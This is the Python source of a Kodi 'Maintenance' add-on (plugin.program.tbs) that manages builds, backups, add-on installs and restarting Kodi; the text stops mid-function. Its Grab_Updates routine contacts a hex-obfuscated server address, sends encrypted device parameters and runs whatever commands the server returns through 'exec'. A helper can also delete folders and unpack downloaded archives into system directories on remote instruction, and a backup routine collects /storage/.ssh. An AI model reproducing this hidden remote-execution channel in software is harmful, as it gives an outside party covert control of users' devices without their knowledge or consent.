import urllib, urllib2, re, xbmcplugin, xbmcgui, xbmc, xbmcaddon, os, sys, time, xbmcvfs
import shutil, binascii, datetime
import downloader, extract
import time
import hashlib
from addon.common.addon import Addon

######################################################
AddonID='plugin.program.tbs'
AddonName='Maintenance'
######################################################
ADDON            =  xbmcaddon.Addon(id=AddonID)
zip              =  ADDON.getSetting('zip')
localcopy        =  ADDON.getSetting('localcopy')
privatebuilds    =  ADDON.getSetting('private')
reseller         =  ADDON.getSetting('reseller')
openelec         =  ADDON.getSetting('openelec')
IIi1IiiiI1Ii     =  ADDON.getSetting('resellerid')
keepfaves        =  ADDON.getSetting('favourites')
keepsources      =  ADDON.getSetting('sources')
keeprepos        =  ADDON.getSetting('repositories')
mastercopy       =  ADDON.getSetting('mastercopy')
username         =  ADDON.getSetting('username').replace(' ','%20')
password         =  ADDON.getSetting('password')
versionoverride  =  ADDON.getSetting('versionoverride')
login            =  ADDON.getSetting('login')
addonportal      =  ADDON.getSetting('addonportal')
commbuilds       =  ADDON.getSetting('maintenance')
hardware         =  ADDON.getSetting('hardwareportal')
maintenance      =  ADDON.getSetting('maintenance')
newsportal       =  ADDON.getSetting('latestnews')
tutorials        =  ADDON.getSetting('tutorialportal')
startupvideo     =  ADDON.getSetting('startupvideo')
startupvideopath =  ADDON.getSetting('startupvideopath')
testingdebug     =  ADDON.getSetting('testdebug')
wizardurl1       =  ADDON.getSetting('wizardurl1')
wizardname1      =  ADDON.getSetting('wizardname1')
wizardurl2       =  ADDON.getSetting('wizardurl2')
wizardname2      =  ADDON.getSetting('wizardname2')
wizardurl3       =  ADDON.getSetting('wizardurl3')
wizardname3      =  ADDON.getSetting('wizardname3')
wizardurl4       =  ADDON.getSetting('wizardurl4')
wizardname4      =  ADDON.getSetting('wizardname4')
wizardurl5       =  ADDON.getSetting('wizardurl5')
wizardname5      =  ADDON.getSetting('wizardname5')
demo             =  ADDON.getSetting('temp')
dialog           =  xbmcgui.Dialog()
dp               =  xbmcgui.DialogProgress()
HOME             =  xbmc.translatePath('special://home/')
USERDATA         =  xbmc.translatePath(os.path.join('special://home/userdata',''))
ADDON_DATA       =  xbmc.translatePath(os.path.join(USERDATA,'addon_data'))
PLAYLISTS        =  xbmc.translatePath(os.path.join(USERDATA,'playlists'))
MEDIA            =  xbmc.translatePath(os.path.join(USERDATA,'media'))
DATABASE         =  xbmc.translatePath(os.path.join(USERDATA,'Database'))
THUMBNAILS       =  xbmc.translatePath(os.path.join(USERDATA,'Thumbnails'))
ADDONS           =  xbmc.translatePath(os.path.join('special://home','addons',''))
CBADDONPATH      =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'default.py'))
FANART           =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'fanart.jpg'))
ADDONXMLTEMP     =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'resources','addonxml'))
SETTINGSXML      =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'resources','settings.xml'))
GUI              =  xbmc.translatePath(os.path.join(USERDATA,'guisettings.xml'))
GUIFIX           =  xbmc.translatePath(os.path.join(USERDATA,'guifix.xml'))
defaulticon      =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'icon_menu.png'))
FAVS             =  xbmc.translatePath(os.path.join(USERDATA,'favourites.xml'))
SOURCE           =  xbmc.translatePath(os.path.join(USERDATA,'sources.xml'))
ADVANCED         =  xbmc.translatePath(os.path.join(USERDATA,'advancedsettings.xml'))
PROFILES         =  xbmc.translatePath(os.path.join(USERDATA,'profiles.xml'))
RSS              =  xbmc.translatePath(os.path.join(USERDATA,'RssFeeds.xml'))
KEYMAPS          =  xbmc.translatePath(os.path.join(USERDATA,'keymaps','keyboard.xml'))
USB              =  xbmc.translatePath(os.path.join(zip))
CBPATH           =  xbmc.translatePath(os.path.join(USB,'Community Builds',''))
startuppath      =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,'startup.xml'))
tempfile         =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,'temp.xml'))
idfile           =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,'id.xml'))
progresstemp     =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,'progresstemp'))
revrepo          =  xbmc.translatePath(os.path.join(ADDONS,'repository.totalrevolution'))
totalrev         =  xbmc.translatePath(os.path.join(ADDONS,'plugin.program.totalrevolution'))
idfiletemp       =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,'idtemp.xml'))
cookie           =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,'temp'))
successtxt       =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,'successtxt.txt'))
notifyart        =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'resources/'))
backupnews       =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'resources','backup2'))
installfile      =  xbmc.translatePath(os.path.join(ADDONS,AddonID,'checknews.py'))
skin             =  xbmc.getSkinDir()
log_path         =  xbmc.translatePath('special://logpath/')
backup_dir       =  '/storage/backup'
restore_dir      =  '/storage/.restore/'
userdatafolder   =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID))
GUINEW           =  xbmc.translatePath(os.path.join(userdatafolder,'guinew.xml'))
guitemp          =  xbmc.translatePath(os.path.join(userdatafolder,'guitemp',''))
tempdbpath       =  xbmc.translatePath(os.path.join(USB,'Database'))
packages         =  os.path.join(ADDONS,'packages')
addonstemp       =  os.path.join(HOME,'addontemp')
backupaddonspath =  xbmc.translatePath(os.path.join(USERDATA,'.cbcfg'))
codename         =  'Venztech'
keywordpath      =  'http://urlshortbot.com/venztech'
EXCLUDES         =  ['firstrun','plugin.program.tbs','plugin.program.totalinstaller','script.module.addon.common','addons','addon_data','userdata','sources.xml','favourites.xml']
localversioncheck=  '0'
BACKUP_DIRS      =  ['/storage/.kodi','/storage/.cache','/storage/.config','/storage/.ssh']
sign             =  '1889903'
TBSXML           =  xbmc.translatePath(os.path.join('special://home/addons/plugin.program.tbs/addon.xml'))
firstrun         =  xbmc.translatePath('special://home/userdata/firstrun/')
cfg              =  os.path.join(ADDON_DATA,AddonID,'cfg')
sellername       =  ADDON.getSetting('resellername')
internetcheck    =  ADDON.getSetting('internetcheck')
cbnotifycheck    =  ADDON.getSetting('cbnotifycheck')
mynotifycheck    =  ADDON.getSetting('mynotifycheck')
TBSDATA          =  xbmc.translatePath(os.path.join(ADDON_DATA,AddonID,''))
xbmc_version     = xbmc.getInfoLabel("System.BuildVersion")

#---------------------------------------------------------------------------------------------------
# Check if system is OE
def OpenELEC_Check():
    xbmc_version=xbmc.getInfoLabel("System.BuildVersion")
    version=float(xbmc_version[:4])
    if version < 14:
        log_path_new = os.path.join(log_path,'xbmc.log')
    else:
        log_path_new = os.path.join(log_path,'kodi.log')
        
    try:
        localfile = open(log_path_new, mode='r')
        content   = localfile.read()
        localfile.close()
    except:
        try:
            localfile = open(os.path.join(HOME,'temp','kodi.log'), mode='r')
            content   = localfile.read()
            localfile.close()
        except:
            try:
                localfile = open(os.path.join(HOME,'temp','xbmc.log'), mode='r')
                content   = localfile.read()
                localfile.close()
            except:
                pass                
            
    if 'OpenELEC' in content:
        return True


if OpenELEC_Check():
    CONFIG = '/storage/.config/'
elif not OpenELEC_Check():
    CONFIG = os.path.join(HOME,binascii.unhexlify('2e636f6e666967'))

infoparse = os.path.join(CONFIG,binascii.unhexlify('74732e68'))

if not os.path.exists(CONFIG):
   os.makedirs(CONFIG)
#-----------------------------------------------------------------------------------------------------------------
#Extract zips show update progress        
def extractallNoProgress(_in, _out):
    try:
        zin = zipfile.ZipFile(_in, 'r')
        zin.extractall(_out)
    
    except Exception, e:
        print str(e)
        return False
    
    return True
#-----------------------------------------------------------------------------------------------------------------
#Extract zips without update progress
def extractallWithProgress(_in, _out, dp):
    zin    = zipfile.ZipFile(_in,  'r')
    nFiles = float(len(zin.infolist()))
    count  = 0
    
    try:
        
        for item in zin.infolist():
            count += 1
            update = count / nFiles * 100
            dp.update(int(update))
            zin.extract(item, _out)
    
    except Exception, e:
        print str(e)
        return False
    
    return True
#---------------------------------------------------------------------------------------------------    
# Main process to create the addons folder for new community build
def CB_Addon_Install_Loop():
    deps = 'defaultskindependecycheck'
    if os.path.exists(addonstemp):
        shutil.rmtree(addonstemp)
    
    if not os.path.exists(addonstemp):
        os.makedirs(addonstemp)

# Grab contents of addon.xml in skin directory, need to check dependencies and copy
# over whole file otherwise skin will update and break
    if skin!='skin.confluence':
        skinxml     = os.path.join(ADDONS,skin,'addon.xml')
        skindeps    = open(skinxml, mode='r')
        skincontent = skindeps.read()
        skindeps.close()
    
        dependencymatch = re.compile('<requires[\s\S]*?\/requires').findall(skincontent)
        deps            = dependencymatch[0] if (len(dependencymatch) > 0) else 'None'

    portalcontent   = Open_URL('http://totalxbmc.com/TI/AddonPortal/approved.php')

    dp.create('Backing Up Add-ons','','Please Wait...')
    
    for name in os.listdir(ADDONS):

#DO NOT copy over totalinstaller and any dependencies
        if not 'totalinstaller' in name and not 'plugin.program.tbs' in name and not 'packages' in name and not 'repo.' in name and not 'repository' in name and os.path.isdir(os.path.join(ADDONS, name)):

# Check the add-on has a valid repo and is not a dependency of the skin
            if name in portalcontent and not name in deps and not 'script.skin' in name and not 'script.common.plugin' in name and not 'script.module' in name and os.path.isdir(os.path.join(ADDONS, name)):

# Check it's not something that's going to cause issues on startup and also make sure it's a valid directory
                if not 'service.xbmc.versioncheck' in name and not 'packages' in name and os.path.isdir(os.path.join(ADDONS, name)):
                    
                    try:
                        dp.update(0,"Backing Up",'[COLOR darkcyan]%s[/COLOR]'%name, 'Please Wait...')
                        os.makedirs(os.path.join(addonstemp,name))
                        
                        newpath        = os.path.join(addonstemp,name,'addon.xml')
                        newpathdefault = os.path.join(addonstemp,name,'default.py')
                        filefix        = open(os.path.join(ADDONS,name,'addon.xml'), mode='r')
                        content        = filefix.read()
                        filefix.close()
                        
                        localnamematch     = re.compile(' name="(.+?)"').findall(content)
                        localprovidermatch = re.compile('provider-name="(.+?)"').findall(content)
                        localmatch         = re.compile('<addon[\s\S]*?">').findall(content)
                        descmatch          = re.compile('<description[\s\S]*?<\/description>').findall(content)
                        namematch          = localnamematch[0] if (len(localnamematch) > 0) else 'None'
                        providernamematch  = localprovidermatch[0] if (len(localprovidermatch) > 0) else 'Anonymous'
                        localcontentmatch  = localmatch[0] if (len(localmatch) > 0) else 'None'
                        descriptionmatch   = descmatch[0] if (len(descmatch) > 0) else 'None'
                        
                        newversion = '<addon id="'+name+'" name="'+namematch+'" version="0" provider-name="'+providernamematch+'">'
                        description = '<description>If you\'re seeing this message it means the add-on is still updating, please wait for the update process to complete.</description>'
                        
                        if localcontentmatch!='None':
                            replacefile = content.replace(descriptionmatch,description).replace(localcontentmatch,newversion)
                        
                        else:
                            replacefile = content.replace(descriptionmatch,description)

                        writefile = open(newpath, mode='w+')
                        writefile.write(str(replacefile))
                        writefile.close()
                        writefile2 = open(newpathdefault, mode='w+')
                        writefile2.write('import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="'+name+'"\nAddonName="'+namematch+'"\ndialog=xbmcgui.Dialog()\nxbmc.executebuiltin("UpdateLocalAddons")\nxbmc.executebuiltin("UpdateAddonRepos")\nchoice=dialog.yesno(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating, would you like check the status of your add-on updates or try re-installing via the Total Installer backup method? We highly recommend checking for updates.",yeslabel="Install Option 2", nolabel="Check Updates")\nif choice==0: xbmc.executebuiltin(\'ActivateWindow(10040,"addons://outdated/",return)\')\nelse: xbmc.executebuiltin(\'ActivateWindow(10001,"plugin://plugin.program.tbs/?mode=grab_addons&url=%26redirect%26addonid%3d\'+AddonID+\'")\')\nxbmcplugin.endOfDirectory(int(sys.argv[1]))')
                        writefile2.close()
                    
                    except:
                        pass

# If it's not in a repo or it's a skin dependency copy the whole add-on over
            else:
                shutil.copytree(os.path.join(ADDONS,name), os.path.join(addonstemp,name))
    
    dp.close()
    
    message_header = "Creating Backup"
    message1       = "Archiving..."
    message2       = ""
    message3       = "Please Wait"
    
    Archive_Tree(addonstemp, backupaddonspath, message_header, message1, message2, message3, '', '')
    
    try:
        shutil.rmtree(addonstemp)
    
    except:
        pass
#---------------------------------------------------------------------------------------------------
#Function to pull commands and update
def Grab_Updates(url):
    isplaying = xbmc.Player().isPlaying()
    if isplaying == 0:
        urlparams = URL_Params()
        link = 'start'

        while not 'sleep' in link:

            try:
                if debug == 'true':
                    print"### URL: "+binascii.unhexlify('687474703a2f2f746c62622e6d652f636f6d6d2e7068703f783d')+encryptme('e',urlparams)
                link = Open_URL2(url+encryptme('e',urlparams))
                if link != '':
                    link = encryptme('d',link).replace('\n',';')
                if debug == 'true':
                    try:
                        print"### Return: "+link
                    except:
                        pass

                if link == '':
                    if debug == 'true':
                        print"### Blank page returned"
                    link = 'sleep'

# Check that no body tag exists, if it does then we know TLBB is offline
                if not '<body' in link and link != '':
                    linematch  = re.compile('com(.+?)="').findall(link)
                    commline   = linematch[0] if (len(linematch) > 0) else ''
                    commatch   = re.compile('="(.+?)endcom"').findall(link)
                    command    = commatch[0] if (len(commatch) > 0) else 'End'
                
                    SF_match   = re.compile('<favourite[\s\S]*?</favourite>').findall(command)
                    SF_command = SF_match[0] if (len(SF_match) > 0) else 'None'

                    if debug == 'true':

                        print"### command: "+command
                        print"### SF_command: "+SF_command

                    Open_URL2(binascii.unhexlify('687474703a2f2f746c62622e6d652f636f6d6d2e7068703f783d')+encryptme('e',urlparams)+'&y='+commline)

                    if debug == 'true':
                        print"### COMMAND: "+command
                        print"### LINK: "+link
                    if SF_command!='None':
                        localfile = open(progresstemp, mode='w+')
                        localfile.write(SF_command)
                        localfile.close()

                    elif command!='End' and not 'sleep' in link:
                        if ';' in command:
                            newcommands = command.split(';')
                            for item in newcommands:
                                if debug == 'true':
                                    print"### command: "+item
                                exec item
                                xbmc.sleep(500)
                                while xbmc.Player().isPlaying():
                                    xbmc.sleep(500)
                        else:
                            exec command
                            xbmc.sleep(500)
                            while xbmc.Player().isPlaying():
                                xbmc.sleep(500)
                            if os.path.exists(progresstemp):
                                os.remove(progresstemp)
                        
                    elif command=='End':
                        if 'sleep' in link:
                            readfile = open(SETTINGSXML, 'r')
                            content = readfile.read()
                            readfile.close()
                            sleep = str(link[6:])
                            if debug == 'true':
                                print"### Sleep: "+sleep
                            writefile      = open(sleeper, 'w+')
                            writefile.write(sleep)
                            writefile.close()
                            xbmc.executebuiltin('StopScript(special://home/addons/plugin.program.tbs/service.py)')
                            xbmc.executebuiltin('RunScript(special://home/addons/plugin.program.tbs/service.py)')
                        xbmc.executebuiltin( 'UpdateLocalAddons' )
                        xbmc.executebuiltin( 'UpdateAddonRepos' )
            except:
                print"### Failed with update"
#---------------------------------------------------------------------------------------------------
#Function to pull commands and update
def DLE(command,repo_link,repo_id):
    downloadpath = os.path.join(packages,'updates.zip')
    if not os.path.exists(packages):
        os.makedirs(packages)
    
    if command=='delete':
        shutil.rmtree(xbmc.translatePath(repo_link))
        Update_Repo()
    
    if command=='addons' or command=='ADDON_DATA' or command=='media' or command=='config' or command=='playlists' or command == 'custom':
#        dp.create('Installing Content','','')
        if not os.path.exists(os.path.join(ADDONS,repo_id)) or repo_id == '':
            try:
                downloader.download(repo_link, downloadpath)
            except:
                pass       
        if (command=="addons" and not os.path.exists(os.path.join(ADDONS,repo_id))) or (command=='addons' and repo_id==''):
            try:
                extract.all(downloadpath, ADDONS)
                Update_Repo()
            except:
                pass

        if command=='ADDON_DATA':
            try:
                extract.all(downloadpath, ADDON_DATA)
            except:
                print"### FAILED TO EXTRACT TO "+ADDON_DATA
        
        if command=='media':
            try:
                extract.all(downloadpath, MEDIA)
            except:
                pass
        
        if command=='config':
            try:
                extract.all(downloadpath, CONFIG)
            except:
                pass

        if command=='playlists':
            try:
                extract.all(downloadpath, PLAYLISTS)
            except:
                pass

        if command=='custom':
            try:
                extract.all(downloadpath, repo_id)
            except:
                print"### Failed to extract update "+repo_link
            
    if os.path.exists(downloadpath):
        try:
            os.remove(downloadpath)
        except:
            pass
#---------------------------------------------------------------------------------------------------
def Kill_XBMC():
#    dialog.ok('Kodi will now close','The system will now attempt to force close Kodi.','You may encounter a freeze, if that happens give it a minute','and if it doesn\'t close please restart your system.')
    if not os.path.exists(scriptfolder):
        os.makedirs(scriptfolder)
    xbmc_version=xbmc.getInfoLabel("System.BuildVersion")
    version=float(xbmc_version[:4])
    if xbmc.getCondVisibility('system.platform.windows'):
        if version < 14:
            try:
                writefile = open(os.path.join(scriptfolder,'win_xbmc.bat'), 'w+')
                writefile.write('@ECHO off\nTASKKILL /im XBMC.exe /f\ntskill XBMC.exe\nXBMC.exe')
                writefile.close()
                os.system(os.path.join(scriptfolder,'win_xbmc.bat'))
            except:
                print"### Failed to run win_xbmc.bat"
        else:
            try:
                writefile = open(os.path.join(scriptfolder,'win_kodi.bat'), 'w+')
                writefile.write('@ECHO off\nTASKKILL /im Kodi.exe /f\ntskill Kodi.exe\nKodi.exe')
                writefile.close()
                os.system(os.path.join(scriptfolder,'win_kodi.bat'))
            except:
                print"### Failed to run win_kodi.bat"
    elif xbmc.getCondVisibility('system.platform.osx'):
        if version < 14:
            try:
                writefile = open(os.path.join(scriptfolder,'osx_xbmc.sh'), 'w+')
                writefile.write('killall -9 XBMC\nXBMC')
                writefile.close()
            except:
                pass
            try:
                os.system('chmod 755 '+os.path.join(scriptfolder,'osx_xbmc.sh'))
            except:
                pass
            try:
                os.system(os.path.join(scriptfolder,'osx_xbmc.sh'))
            except:
                print"### Failed to run osx_xbmc.sh"
        else:
            try:
                writefile = open(os.path.join(scriptfolder,'osx_kodi.sh'), 'w+')
                writefile.write('killall -9 Kodi\nKodi')
                writefile.close()
            except:
                pass
            try:
                os.system('chmod 755 '+os.path.join(scriptfolder,'osx_kodi.sh'))
            except:
                pass
            try:
                os.system(os.path.join(scriptfolder,'osx_kodi.sh'))
            except:
                print"### Failed to run osx_kodi.sh"
#    else:
    elif xbmc.getCondVisibility('system.platform.android'):
        if os.path.exists('/data/data/com.rechild.advancedtaskkiller'):
            dialog.ok('Attempting to force close','On the following screen please press the big button at the top which says "KILL selected apps". Kodi will restart, please be patient while your system updates the necessary files and your skin will automatically switch once fully updated.')
            try:
                xbmc.executebuiltin('StartAndroidActivity(com.rechild.advancedtaskkiller)')
            except:
                print"### Failed to run Advanced Task Killer. Make sure you have it installed, you can download from https://archive.org/download/com.rechild.advancedtaskkiller/com.rechild.advancedtaskkiller.apk"
        else:
            dialog.ok('Advanced Task Killer Not Found',"The Advanced Task Killer app cannot be found on this system. Please make sure you actually installed it after downloading. We can't do everything for you - on Android you do have to physically click on the download to install an app.")
        try:
            os.system('adb shell am force-stop org.xbmc.kodi')
        except:
            pass
        try:
            os.system('adb shell am force-stop org.kodi')
        except:
            pass
        try:
            os.system('adb shell am force-stop org.xbmc.xbmc')
        except:
            pass
        try:
            os.system('adb shell am force-stop org.xbmc')
        except:
            pass
        try:
            os.system('adb shell kill org.xbmc.kodi')
        except:
            pass
        try:
            os.system('adb shell kill org.kodi')
        except:
            pass
        try:
            os.system('adb shell kill org.xbmc.xbmc')
        except:
            pass
        try:
            os.system('adb shell kill org.xbmc')
        except:
            pass
        try:
            os.system('Process.killProcess(android.os.Process.org.xbmc,kodi());')
        except:
            pass
        try:
            os.system('Process.killProcess(android.os.Process.org.kodi());')
        except:
            pass
        try:
            os.system('Process.killProcess(android.os.Process.org.xbmc.xbmc());')
        except:
            pass
        try:
            os.system('Process.killProcess(android.os.Process.org.xbmc());')
        except:
            pass
    elif xbmc.getCondVisibility('system.platform.linux'):
        if version < 14:
            try:
                writefile = open(os.path.join(scriptfolder,'linux_xbmc'), 'w+')
                writefile.write('killall XBMC\nkillall -9 xbmc.bin\nXBMC')
                writefile.close()
            except:
                pass
            try:
                os.system('chmod a+x '+os.path.join(scriptfolder,'linux_xbmc'))
            except:
                pass
            try:
                os.system(os.path.join(scriptfolder,'linux_xbmc'))
            except:
                print "### Failed to run: linux_xbmc"
        else:
            try:
                writefile = open(os.path.join(scriptfolder,'linux_kodi'), 'w+')
                writefile.write('killall Kodi\nkillall -9 kodi.bin\nkodi')
                writefile.close()
            except:
                pass
            try:
                os.system('chmod a+x '+os.path.join(scriptfolder,'linux_kodi'))
            except:
                pass
            try:
                os.system(os.path.join(scriptfolder,'linux_kodi'))
            except:
                print "### Failed to run: linux_kodi"
    else: #ATV and OSMC
        try:
            os.system('killall AppleTV')
        except:
            pass
        try:
            os.system('sudo initctl stop kodi')
        except:
            pass
        try:
            os.system('sudo initctl stop xbmc')
        except:
            pass
#---------------------------------------------------------------------------------------------------
##Function to create a text box
def Open_URL(url):
    req = urllib2.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    response = urllib2.urlopen(req)
    link     = response.read()
    response.close()
    return link
#-----------------------------------------------------------------------------------------------------------------
##Function to create a text box
def Open_URL2(url):
    req = urllib2.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    try:
        response = urllib2.urlopen(req, timeout = 5)
    except:
        try:
            response = urllib2.urlopen(req, timeout = 5)
        except:
            try:
                response = urllib2.urlopen(req, timeout = 5)
            except:
                response = ''
    if response != '':
        link     = response.read()
        response.close()
        return link.replace('\r','\\r').replace('\n','\\n').replace('\t','\\t')
    else:
        return response
#---------------------------------------------------------------------------------------------------
# Function to create an OE tar backup
def OEB():
    import tarfile

    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)

    tar = tarfile.open(os.path.join(backup_dir, Timestamp()+'.tar'), 'w')
    
    for directory in BACKUP_DIRS:
        tar.add(directory)
    
    tar.close()
#---------------------------------------------------------------------------------------------------
#Step 1 of the addon install process (installs the actual addon)
def Addon_Install_Zero(name,contenttypes,repo_link,repo_id,addon_id,provider_name,forum,data_path):
    addonpath = xbmc.translatePath(os.path.join(ADDONS, addon_id))
    forum     = str(forum)
    
    if not os.path.exists(addonpath):
        cont=1
    
    else:
        cont=0
    
    repo_id  = str(repo_id)
    repopath = xbmc.translatePath(os.path.join(ADDONS, repo_id))
    
    if os.path.exists(addonpath):
        addonexists=1
        choice = dialog.yesno('Add-on Already Installed','This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.')
        
        if choice == 1:
            Remove_Addons(addonpath)
            cont=1
    else:
        addonexists = 0
    
    if cont==1:
        
        if (repo_id != 'repository.xbmc.org') and not (os.path.exists(repopath)) and (repo_id != '') and ('superrepo' not in repo_id):
            Install_Repo(repo_id)
        
        if not os.path.exists(addonpath): # Create new placeholder for addon.xml and default.py
            os.makedirs(addonpath)
        
        newpath        = os.path.join(ADDONS,addon_id,'addon.xml')
        newpathdefault = os.path.join(ADDONS,addon_id,'default.py')
        
        shutil.copyfile(ADDONXMLTEMP, newpath) # Copy template addon.xml
        
        filefix = open(os.path.join(newpath), mode='r')
        content = filefix.read()
        filefix.close()
        
    # Section to find and replace strings in template addon.xml
        localidmatch       = re.compile('testid[\s\S]*?').findall(content)
        idmatch            = localidmatch[0] if (len(localidmatch) > 0) else 'None'
        localnamematch     = re.compile('testname[\s\S]*?').findall(content)
        namematch          = localnamematch[0] if (len(localnamematch) > 0) else 'None'
        localprovidermatch = re.compile('testprovider[\s\S]*?').findall(content)
        providermatch      = localprovidermatch[0] if (len(localprovidermatch) > 0) else 'None'
        localprovidesmatch = re.compile('testprovides[\s\S]*?').findall(content)
        providesmatch      = localprovidesmatch[0] if (len(localprovidesmatch) > 0) else 'None'
        replacefile        = content.replace(idmatch,addon_id).replace(namematch,name).replace(providermatch,provider_name).replace(providesmatch,contenttypes)
        
        writefile = open(newpath, mode='w+')
        writefile.write(str(replacefile))
        writefile.close()
        
        writefile2 = open(newpathdefault, mode='w')
        writefile2.write('import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="'+addon_id+'"\nAddonName="'+name+'"\ndialog=xbmcgui.Dialog()\nxbmc.executebuiltin("UpdateLocalAddons")\nxbmc.executebuiltin("UpdateAddonRepos")\nchoice=dialog.yesno(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating, would you like check the status of your add-on updates or try re-installing via the Total Installer backup method? We highly recommend checking for updates.",yeslabel="Install Option 2", nolabel="Check Updates")\nif choice==0: xbmc.executebuiltin(\'ActivateWindow(10040,"addons://outdated/",return)\')\nelse: xbmc.executebuiltin(\'ActivateWindow(10001,"plugin://plugin.program.tbs/?mode=grab_addons&url=%26redirect%26addonid%3d\'+AddonID+\'")\')\nxbmcplugin.endOfDirectory(int(sys.argv[1]))')
        writefile2.close()
        
        xbmc.sleep(1000)
        
        if os.path.exists(addonpath) and addonexists == 0:
            incremental = 'http://totalxbmc.com/totalrevolution/AddonPortal/downloadcount.php?id=%s' % (addon_id)
            Open_URL(incremental)
        
        xbmc.executebuiltin( 'UpdateLocalAddons' )
        xbmc.executebuiltin( 'UpdateAddonRepos' )
        dialog.ok(name+" Install Complete",'[COLOR=dodgerblue]'+name+'[/COLOR] has now been installed, please allow a few moments for Kodi to update the add-on and it\'s dependencies.')
    
    xbmc.executebuiltin('Container.Refresh')         
#---------------------------------------------------------------------------------------------------
#Function to remove textures13.db and thumbnails folder
def Remove_Textures():
    textures   =  xbmc.translatePath('special://home/userdata/Database/Textures13.db')
    try:
        dbcon = database.connect(textures)
        dbcur = dbcon.cursor()
        dbcur.execute("DROP TABLE IF EXISTS path")
        dbcur.execute("VACUUM")
        dbcon.commit()
        dbcur.execute("DROP TABLE IF EXISTS sizes")
        dbcur.execute("VACUUM")
        dbcon.commit()
        dbcur.execute("DROP TABLE IF EXISTS texture")
        dbcur.execute("VACUUM")
        dbcon.commit()
        dbcur.execute("""CREATE TABLE path (id integer, url text, type text, texture text, primary key(id))""")
        dbcon.commit()
        dbcur.execute("""CREATE TABLE sizes (idtexture integer,size integer, width integer, height integer, usecount integer, lastusetime text)""")
        dbcon.commit()
        dbcur.execute("""CREATE TABLE texture (id integer, url text, cachedurl text, imagehash text, lasthashcheck text, PRIMARY KEY(id))""")
        dbcon.commit()
    except:
        pass
#---------------------------------------------------------------------------------------------------
#Function to pull commands and update
def RMT():
    Remove_Textures()
    Wipe_Cache()
#---------------------------------------------------------------------------------------------------
#Function to pull commands and update
def SF(command,SF_folder,SF_link):
    check4='SF'
# Check if folder exists, if not create folder and favourites.xml file
    folder = xbmc.translatePath(os.path.join(ADDON_DATA,'plugin.program.super.favourites','Super Favourites',SF_folder))
    SF_favs   = os.path.join(folder,'favourites.xml')
    
    if command=='add':

        if not os.path.exists(folder):
            os.makedirs(folder)
            localfile = open(SF_favs, mode='w+')
            localfile.write('<favourites>\n</favourites>')
            localfile.close()
        
# Grab content between favourites tags, we'll replace this later
        localfile2 = open(SF_favs, mode='r')
        content2 = localfile2.read()
        localfile2.close()

        favcontent    = re.compile('<favourite name="[\s\S]*?\/favourites>').findall(content2)
        faves_content = favcontent[0] if (len(favcontent) > 0) else '\n</favourites>'
        
# Copy clean contents of online SF command into memory - if we grab and pass through as paramater the /r /t /n etc. tags fail to translate correctly
        localfile = open(progresstemp, mode='r')
        newcontent = localfile.read()
        localfile.close()
        
#Write new favourites file
        if not newcontent in content2:
            localfile = open(SF_favs, mode='w+')
            if faves_content == '\n</favourites>':
                newfile = localfile.write('<favourites>\n\t'+newcontent+faves_content)
            else:
                newfile = localfile.write('<favourites>\n\t'+newcontent+'\n\t'+faves_content)
            localfile.close()
        
    if command=='delete':

# Grab content between favourites tags, we'll replace this later
        try:
            localfile2 = open(SF_favs, mode='r')
            content2 = localfile2.read()
            localfile2.close()

# Copy clean contents of online SF command into memory - if we grab and pass through as paramater the /r /t /n etc. tags fail to translate correctly
            localfile = open(progresstemp, mode='r')
            newcontent = localfile.read()
            localfile.close()
        
#Write new favourites file
            localfile = open(SF_favs, mode='w+')
            newfile = localfile.write(content2.replace('\n\t'+newcontent,''))
            localfile.close()
        except:
            pass

# Attempt to delete the SF folder
    if command=='delfolder':

        try:
            shutil.rmtree(folder)
        except:
            pass
#---------------------------------------------------------------------------------------------------
# Create a standard text box
def TXT(heading,anounce):
  check5='TXT'
  class TextBox():
    WINDOW=10147
    CONTROL_LABEL=1
    CONTROL_TEXTBOX=5
    def __init__(self,*args,**kwargs):
      xbmc.executebuiltin("ActivateWindow(%d)" % (self.WINDOW, )) # activate the text viewer window
      self.win=xbmcgui.Window(self.WINDOW) # get window
      xbmc.sleep(500) # give window time to initialize
      self.setControls()
    def setControls(self):
      self.win.getControl(self.CONTROL_LABEL).setLabel(heading) # set heading
      try: f=open(anounce); text=f.read()
      except: text=anounce
      self.win.getControl(self.CONTROL_TEXTBOX).setText(str(text))
      return
  TextBox()
  while xbmc.getCondVisibility('Window.IsVisible(textviewer)'):
      xbmc.sleep(500)
#-----------------------------------------------------------------------------------------------------------------
#Option to install a non-approved addon via the repo in kodi
def Addon_Install_NA(name,contenttypes,repo_link,repo_id,addon_id,provider_name,forum,data_path):
    repopath  = xbmc.translatePath(os.path.join(ADDONS, repo_id))
    addonpath = xbmc.translatePath(os.path.join(ADDONS, addon_id))
    
    if os.path.exists(addonpath):
        
        choice = dialog.yesno('Add-on Already Installed','This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.')
        
        if choice == 1:
            Remove_Addons(addonpath)
    
    if os.path.exists(repopath):
        
        if os.path.exists(addonpath):
             addonexists=1
        
        else:
            addonexists = 0
        
